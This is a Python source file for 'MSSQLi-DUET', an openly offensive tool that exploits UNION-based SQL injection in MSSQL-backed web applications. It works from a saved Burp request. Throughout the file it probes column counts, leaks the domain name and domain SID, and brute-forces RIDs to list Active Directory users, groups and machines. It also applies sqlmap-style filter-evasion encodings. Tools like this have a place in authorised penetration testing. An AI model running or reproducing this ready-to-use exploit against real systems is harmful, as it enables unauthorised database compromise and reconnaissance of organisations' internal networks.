import sys
import struct
import requests
import string
import json
import re
import argparse
import random
from time import sleep, strftime, localtime

# MSSQLi-DUET : MSSQL Injection-based Domain User Enumeration Tool

#Args here! Get your args here!
def get_args():
    parser = argparse.ArgumentParser(description="MSSQLi-DUET - MSSQL (Injection-based) Domain User Enumeration Tool",epilog="Prepare to be enumerated!")
    parser.add_argument('-i','--injection',type=str, help="Injection point. Provide only the data needed to escape the query.", required=True) 
    parser.add_argument('-e','--encoding',type=str, help="Type of encoding: unicode, doubleencode, unmagicquotes", required=False)
    parser.add_argument('-t','--time_delay',type=int, help="Time delay for requests.", required=True)
    parser.add_argument('-rid','--rid_range',type=str, help="Hypenated range of RIDs to bruteforce. Ex: 1000-1200", required=True)
    parser.add_argument('-ssl','--ssl',type=bool, help="Add flag for HTTPS", required=False)
    parser.add_argument('-p','--parameter',type=str, help="Vulnerable parameter", required=True)
    parser.add_argument('-proxy','--proxy',type=str, help="Proxy connection string. Ex: 127.0.0.1:8080", required=False)
    parser.add_argument('-o', '--outfile',type=str, help="Outfile for username enumeration results.",required=False)
    parser.add_argument('-r','--request_file',type=str, help="Raw request file saved from Burp", required=True)
    args = parser.parse_args()
    
    encoding = args.encoding
    time_delay = args.time_delay
    rid_range = args.rid_range
    parameter = args.parameter
    request_file = args.request_file
    data = args.injection
    ssl = args.ssl
    proxy = args.proxy
    outfile = args.outfile

    return encoding,time_delay,rid_range,parameter,request_file,data,ssl,proxy,outfile

# Begin tamper functions  -  Modify area with tamper functions that you wish to use, and then modify the arg + payload_processing() function
# https://github.com/sqlmapproject/sqlmap/tree/master/tamper
#======================================================================================

#Unescaped unicode for JSON type data
def unicode_encode_unescaped(payload):
    retVal = payload
    if payload:
        retVal = ""
        i = 0

        while i < len(payload):
            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                retVal += "u00%s" % payload[i + 1:i + 3]
                i += 3
            else:
                retVal += 'u%.4X' % ord(payload[i])
                i += 1

    return retVal

#Escaped unicode
def unicode_encode(payload):
    retVal = payload
    if payload:
        retVal = ""
        i = 0

        while i < len(payload):
            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                retVal += "\\u00%s" % payload[i + 1:i + 3]
                i += 3
            else:
                retVal += '\\u%.4X' % ord(payload[i])
                i += 1

    return retVal


def chardoubleencode(payload):
    retVal = payload

    if payload:
        retVal = ""
        i = 0

        while i < len(payload):
            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                retVal += '%%25%s' % payload[i + 1:i + 3]
                i += 3
            else:
                retVal += '%%25%.2X' % ord(payload[i])
                i += 1

    return retVal


def unmagicquotes(payload):
    retVal = payload

    if payload:
        found = False
        retVal = ""

        for i in range(len(payload)):
            if payload[i] == '\'' and not found:
                retVal += "%bf%27"
                found = True
            else:
                retVal += payload[i]
                continue

        if found:
            _ = re.sub(r"(?i)\s*(AND|OR)[\s(]+([^\s]+)\s*(=|LIKE)\s*\2", "", retVal)
            if _ != retVal:
                retVal = _
                retVal += "-- -"
            elif not any(_ in retVal for _ in ('#', '--', '/*')):
                retVal += "-- -"
    return retVal


#Payload processing function - Detemines encoding path based on args.
#=======================================================================================

def payload_processing(payload,encoding):
    if encoding == 'unicode':
        mod_payload = unicode_encode(payload)
    
    elif encoding == 'unicode_unescaped':
        mod_payload = unicode_encode_unescaped(payload)

    elif encoding == 'doubleencode':
        mod_payload = chardoubleencode(payload)

    elif encoding == 'unmagicquotes':
        mod_payload = unmagicquotes(payload)

    else:
        mod_payload = payload

    return mod_payload


#Helper functions here
#========================================================================================
# GET request processing
def get_request(url,payload,headers,encoding,proxies,cookies):
    #Not ready yet, add later and test

    req = requests.get(url+payload_processing(payload,encoding),headers=headers,proxies=proxies,cookies=cookies)

    return req


#Non-JSON POST request processing
def post_request_form(url,body,headers,payload,encoding,proxies,cookies):

    params = dict(x.split('=') for x in body.split('&'))

    if parameter in params:
        params[parameter] = payload_processing(payload,encoding)

    req = requests.post(url,data=params,headers=headers,proxies=proxies,cookies=cookies)

    if req.status_code != 200:
        print("[-] Received " + str(req.status_code) + " response code. Possible rate throttling or request error.")
        print("[!] Exiting.")
        sys.exit(1)

    return req


# JSON-type POST request processing
def post_request_json(url,body,headers,payload,encoding,proxies,cookies):

    headers = {'Content-Type': 'application/json'}
    params = json.loads(body)
    
    if encoding == "unicode":
        new_encoding = "unicode_unescaped"
        #Weird encoding path here for unicode so that it the \\ are not encoded
        
        if parameter in params:
            params[parameter] = payload_processing(payload,new_encoding)

        params = str(params).replace('\'','\"')
        params = params.replace('u','\\u')
        req = requests.post(url,headers=headers,data=params,proxies=proxies,cookies=cookies)
    

    else:
        if parameter in params:
            params[parameter] = payload_processing(payload,encoding)
    
            req = requests.post(url,headers=headers,json=params,proxies=proxies,cookies=cookies)
        

    if req.status_code != 200:
        print("[-] Received " + str(req.status_code) + " response code. Possible rate throttling or request error.")
        print("[!] Exiting.")
        sys.exit(1)

    return req


#Convert hex representation of SID into an actual SID string value
def sid_to_str(sid):
    if sys.version_info.major < 3:
        revision = ord(sid[0])
    else:
        revision = sid[0]

    if sys.version_info.major < 3:
        number_of_sub_ids = ord(sid[1])
    else:
        number_of_sub_ids = sid[1]
    iav = struct.unpack('>Q', b'\x00\x00' + sid[2:8])[0]
    sub_ids = [struct.unpack('<I', sid[8 + 4 * i:12 + 4 * i])[0]
               for i in range(number_of_sub_ids)]

    return 'S-{0}-{1}-{2}'.format(revision, iav, '-'.join([str(sub_id) for sub_id in sub_ids]))


#Modify the SID hex value retrieved from query 
def prepare_sid(sid):
    hex_string = bytes.fromhex(sid[2:])
    mod_sid = sid_to_str(hex_string)
    domain_sid_data = mod_sid.split('-')[:7]
    domain_sid = '-'.join(domain_sid_data) + "-"

    print(domain_sid+"\n")
    return domain_sid


#Prep the union select preamble
def generate_payload(column_number,column_type):
    
    i = 0
    payload = " UNION SELECT "
    
    while i < (column_number - 1):
        payload += (column_type + ",")
        i += 1

    return payload


#Parse the raw request file for the proper data, method, and headers
def parse_request(request_file,protocol):
    #This only works if Burp's copy to file function is used. Copy/pasting into a document causes issues with extraneous chars (\r\n). Will solve later...
    with open(request_file, 'rb') as f:
        headers = list(f)
        
        #Get request method
        if "POST" in str(headers[0]):
            method = "POST"
            data_field = headers[-1]
            body = data_field.decode("utf-8")

        else:
            method = "GET"
              
        #Get URL
        resource = str(headers[0]).split(' ')[1]

        #Get Host
        host_header = str(headers[1]).split(' ')[1]
        host = host_header[:-5] 

        #Get Content-Type
        #Default to the following header
        content_type = "application/x-www-form-urlencoded"
        for header in headers:
            if b"Content-Type:" in header:
                content_type_header = str(header).split(' ')[1]
                content_type = content_type_header[:-5]

        #Get cookies
        cookies = None
        for header in headers:
            if b"cookies:" in header or b"Cookies:" in header:
                 header_string = str(header)[:-5]
                 cookie_values = str(header_string).split(':')[1]
                 cookies = dict(x.split('=') for x in cookie_values.split(';'))

        f.close()
        

    if protocol == True:
        url = "https://"

    else:
        url = "http://"
    
    url += host
    url += resource

    print("[+] Collected request data:")
    print("Target URL =", url)
    print("Method =",method)
    print("Content-Type =",content_type)
    
    print("Cookies = ",cookies)
    
    if method == "POST":
        print("Request data =",body)

    else:
        body = False
    print('\n')
    return url,method,content_type,body,cookies


#Injection functions here
#=============================================================================================

#Use injection to leak the domain SID value in hex format
def extract_sid(method,url,content_type,body,domain,column_number,column_type,data,parameter,encoding,proxies,cookies):
    print("[+] Discovering domain SID...")

    headers = {"Content-Type":content_type}

    payload = data
    payload += generate_payload(column_number,column_type)
    payload += f"(SELECT CONCAT ( 'W00TW00T', (select sys.fn_varbintohexstr(SUSER_SID('{domain}\\Administrator'))), 'W00TW00T' ) AS Result)--"


    if method == "POST":
        if "json" in content_type:
            response = post_request_json(url,body,headers,payload,encoding,proxies,cookies)

        else:
            response = post_request_form(url,body,headers,payload,encoding,proxies,cookies)
        
    else:
        response = get_request(url,payload,headers,encoding,proxies,cookies)
            

    determinant = response.text
 
    leaked_sid = str(re.search(rf"(?<=W00TW00T)(.+?)(?=W00TW00T)",determinant).group())

    result = prepare_sid(leaked_sid)

    return result



#Enumerate for AD users given a range
def enum_users(method,url,content_type,body,domain,column_number,column_type,data,parameter,time_delay,sid,rid_range,encoding,proxies,cookies):
    print("[+] Enumerating Active Directory via SIDs...")
    
    max_rid = rid_range.split("-")[1]
    min_rid = rid_range.split("-")[0]

    headers = {'Content-Type': content_type}

    users_list = []

    for i in range(int(min_rid),int(max_rid)):
        i = str(i)
        
        payload = data
        payload += generate_payload(column_number,column_type)
        payload += f"(SELECT CONCAT ( 'W00TW00T', (SUSER_SNAME(SID_BINARY(N'{sid}{i}'))), 'W00TW00T' ) AS Result)--"

        if method == "POST":
            if "json" in content_type:
                response = post_request_json(url,body,headers,payload,encoding,proxies,cookies)

            else:
                response = post_request_form(url,body,headers,payload,encoding,proxies,cookies)
            
        else:
            response = get_request(url,payload,headers,encoding,proxies,cookies)
            
        determinant = response.text

        if domain in determinant:
            username = str(re.search(rf"(?<=W00TW00T)(.+?)(?=W00TW00T)",determinant).group())
            users_list.append(username)
        sleep(time_delay)
  
    return users_list

#Logic to determine the number of columns and the type of data that can be used.
def determine_columns(method,url,content_type,body,data,parameter,encoding,proxies,cookies):
    print("[+] Determining the number of columns in the table...")
    payload = data

    headers = {'Content-Type': content_type}

    if method == "POST":
        if "json" in content_type:
            response = post_request_json(url,body,headers,payload,encoding,proxies,cookies)

        else:
            response = post_request_form(url,body,headers,payload,encoding,proxies,cookies)
        
    else:
        response = get_request(url,payload,headers,encoding,proxies,cookies)

    
    baseline_response = response.text


    payload = data + "order by 1--"

    headers = {'Content-Type': content_type}

    if method == "POST":
        if "json" in content_type:
            response = post_request_json(url,body,headers,payload,encoding,proxies,cookies)

        else:
            response = post_request_form(url,body,headers,payload,encoding,proxies,cookies)
        
    else:
        response = get_request(url,payload,headers,encoding,proxies,cookies)

    
    second_response = response.text
    
    
    if baseline_response == second_response:
        print("[-] Cannot determine the number of columns. Check responses, payload or encoding method.")
        sys.exit(1)
    

    #Increment order by value to determine number of columns
    i = 2
    valid = True
    while valid:
        payload = data + f"order by {i}--" 
        
        if method == "POST":
            if "json" in content_type:
                response = post_request_json(url,body,headers,payload,encoding,proxies,cookies)

            else:
                response = post_request_form(url,body,headers,payload,encoding,proxies,cookies)
        
        else:
            response = get_request(url,payload,headers,encoding,proxies,cookies)
    

        if str(response.text) != str(second_response):
            valid = False
            break
        elif i == 50:
            valid = False
            print("[-] Could not determine number of columns. Check responses, payload or request data.")
            sys.exit(1)
            
        else:
            i += 1
            continue

    print("\t[!] Number of columns is ", i-1)
    column_number = (i-1)

    #Now determine what can be used for the column type
    print("[+] Determining column type...")
    
    try_types = ['null','1','test']

    for j in try_types:
        payload = data
        payload += generate_payload(column_number,j)
        payload += "@@version--"

        if method == "POST":
            if "json" in content_type:
                response = post_request_json(url,body,headers,payload,encoding,proxies,cookies)

            else:
                response = post_request_form(url,body,headers,payload,encoding,proxies,cookies)
        
        else:
            response = get_request(url,payload,headers,encoding,proxies,cookies)
      
        determinant = response.text

        if "Microsoft" in determinant:
            column_type = j
            print("\t[!] Column type is", j)
            break      
        
        else:
            print("\t[-] Column type not", j)

    return column_number,column_type

#Function to extract the name of the Domain from the database
def leak_domain_name(method,url,content_type,body,column_number,column_type,data,parameter,encoding,proxies,cookies):

    print("[+] Discovering domain name...")

    headers = {"Content-Type":content_type}

    payload = data
    payload += generate_payload(column_number,column_type)
    payload += f"(SELECT CONCAT ( 'W00TW00T', (select default_domain()), 'W00TW00T' ) AS Result)--"


    if method == "POST":
        if "json" in content_type:
            response = post_request_json(url,body,headers,payload,encoding,proxies,cookies)

        else:
            response = post_request_form(url,body,headers,payload,encoding,proxies,cookies)
        
    else:
        response = get_request(url,payload,headers,encoding,proxies,cookies)

    determinant = response.text

    leaked_domain = str(re.search(rf"(?<=W00TW00T)(.+?)(?=W00TW00T)",determinant).group())
    print("\t[+] Domain =",leaked_domain)      
    
    return leaked_domain

# Additional enumeration and reporting functions
#===========================================================================================

def check4machines(all_results):
    print("[+] Determining network hosts...")
    machines = []
    for i in all_results:
        if i[-1] == "$":
            print(i)
            machines.append(i)
    print("\n")
    return machines

def check4groups(all_results):
    print("[+] Determining groups...")
    groups = []
    for i in all_results:
        if " " in i:
            print(i)
            groups.append(i)
    print("\n")
    return groups

def check4users(all_results):
    print("[+] Determining users...")
    users = []
    for i in all_results:
        if " " in i or i[-1] == "$":
            pass
        else:
            print(i)
            users.append(i)
    print("\n")
    return users

#Main function
#===========================================================================================
def main(encoding,time_delay,sid_range,parameter,request_file,data,ssl,proxy,outfile):
    
    if proxy:
        IP = proxy.split(':')[0]
        PORT = proxy.split(':')[1]
        proxies = {"http":f"http://{IP}:{PORT}","https":f"http://{IP}:{PORT}"}

    else:
        proxies = None

    url,method,content_type,body,cookies = parse_request(request_file,ssl)

    column_number, column_type = determine_columns(method,url,content_type,body,data,parameter,encoding,proxies,cookies)

    domain = leak_domain_name(method,url,content_type,body,column_number,column_type,data,parameter,encoding,proxies,cookies)
    
    sid = extract_sid(method,url,content_type,body,domain,column_number,column_type,data,parameter,encoding,proxies,cookies)

    all_results = enum_users(method,url,content_type,body,domain,column_number,column_type,data,parameter,time_delay,sid,rid_range,encoding,proxies,cookies)

    user_results = check4users(all_results)
    machine_results = check4machines(all_results)
    group_results = check4groups(all_results)

    if outfile:
        f = open(outfile,'w')
        f.write("")
        f.write("[+] Users:\n")
        for i in user_results:
            f.write(str(i)+'\n')
        f.write("\n")
        f.write("[+] Groups:\n")
        for j in group_results:
            f.write(str(j)+'\n')  
        f.write("\n")
        f.write("[+] Hosts:\n")
        for k in machine_results:
            f.write(str(k)+'\n')    
        f.close()


if __name__ == '__main__':
    start_time = strftime("%a, %d %b %Y %H:%M:%S", localtime())
    print("[+] Beginning enumeration - Start time: ", start_time)
    encoding,time_delay,rid_range,parameter,request_file,data,ssl,proxy,outfile = get_args()
    main(encoding,time_delay,rid_range,parameter,request_file,data,ssl,proxy,outfile)
    print("\n[!] Finished!\n")
    end_time = strftime("%a, %d %b %Y %H:%M:%S", localtime())
    print(end_time)
